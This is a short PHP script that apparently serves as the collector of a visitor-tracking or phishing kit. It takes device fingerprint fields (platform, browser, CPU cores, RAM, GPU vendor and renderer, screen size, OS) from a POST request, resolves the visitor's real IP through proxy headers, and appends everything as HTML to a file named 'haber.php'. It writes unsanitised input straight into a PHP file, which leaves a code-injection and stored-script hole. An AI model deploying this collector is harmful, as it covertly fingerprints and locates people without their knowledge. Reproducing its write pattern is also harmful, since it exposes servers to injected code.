<?php
header('Content-Type: text/html');
{
  $ptf = $_POST['Ptf'];
  $brw = $_POST['Brw'];
  $cc = $_POST['Cc'];
  $ram = $_POST['Ram'];
  $ven = $_POST['Ven'];
  $ren = $_POST['Ren'];
  $ht = $_POST['Ht'];
  $wd = $_POST['Wd'];
  $os = $_POST['Os'];

  function getUserIP()
  {
    // Get real visitor IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
  }

  $ip = getUserIP();
  //
  $data['dev'] = array();

  $data['dev'][] = array('platform' => $ptf,
  'browser' => $brw,
  'cores' => $cc,
  'ram' => $ram,
  'vendor' => $ven,
  'render' => $ren,
  'ip' => $ip,
  'ht' => $ht,
  'wd' => $wd,
  'os' => $os);

  $jinfo = json_encode($data);
 $f = fopen('haber.php', 'a');
  fwrite($f, '<pre><tr><b><tr><b><font color="#FFFFFF">Hardware:</font><b><font color="#F05921">'.$jinfo.'</font></tr></b></b>

      <b><font color="#FFFFFF">Cores:</font><td><font color="#00E2FF">'.$cc.'</font><br></td></b>
      <b><font color="#FFFFFF">Ram:</font><td><font color="#00E2FF">'.$ram.'</font><br></td></b>


</tr></br>
</pre>');
  fclose($f);
}
?>
